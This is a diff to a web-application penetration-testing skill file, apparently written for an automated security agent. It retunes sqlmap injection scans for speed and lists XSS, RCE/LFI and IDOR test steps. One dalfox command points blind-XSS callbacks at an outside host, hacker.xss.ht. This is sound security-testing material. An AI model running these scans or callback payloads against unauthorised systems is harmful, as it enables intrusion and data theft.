@@ -26,7 +26,7 @@ Use when target is a web application (HTTP/HTTPS). Especially for: form inputs, 
 ## Methodology
 
 - 1. Map attack surface (use attack-surface-recon skill results)
-- 2. For each input vector: test SQLi (sqlmap --batch --risk=3 --level=5)
+- 2. For each input vector: test SQLi (sqlmap -p <param> --technique=BEU --smart --batch --level=1 --risk=1)
 - 3. Test XSS (dalfox + manual payload injection)
 - 4. Test RCE/LFI (template injection, file inclusion via ffuf wordlists)
 - 5. Test IDOR (replace IDs in URL/JSON + observe responses)
@@ -37,7 +37,14 @@ Use when target is a web application (HTTP/HTTPS). Especially for: form inputs, 
 ## Tool Recipes
 
 ```bash
-sqlmap -u 'http://target/page?id=1' --batch --risk=3 --level=5 --dbs
+# Fast first pass: one parameter, cheap techniques, heuristic skip.
+# --level 5 --risk 3 explodes the payload set and cannot finish in 420s.
+sqlmap -u 'http://target/page?id=1' -p id --technique=BEU --smart --batch --level=1 --risk=1
+```
+```bash
+# Only if the BEU pass is clean but the target still looks injectable:
+# time-based blind costs ~10x more requests — always a separate, scoped call.
+sqlmap -u 'http://target/page?id=1' -p id --technique=BT --smart --batch
 ```
 ```bash
 dalfox url 'http://target/page?q=test' --blind 'https://hacker.xss.ht'
